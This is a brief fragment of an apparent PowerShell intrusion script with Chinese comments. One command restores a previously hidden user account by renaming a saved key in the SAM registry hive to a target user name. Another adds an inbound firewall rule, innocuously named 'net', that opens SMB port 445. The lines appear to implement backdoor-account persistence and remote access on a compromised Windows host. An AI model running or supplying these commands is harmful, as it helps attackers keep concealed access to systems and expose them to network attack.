...
# 恢复被删除用户的注册表
Rename-Item -Path  HKLM:\SAM\SAM\Domains\Account\Users\save -NewName "$target_user"
...
# 打开445端口
New-NetFirewallRule -Name "net" -DisplayName "net" -Enabled 1 -Direction Inbound -Action Allow -LocalPort 445 -Protocol TCP
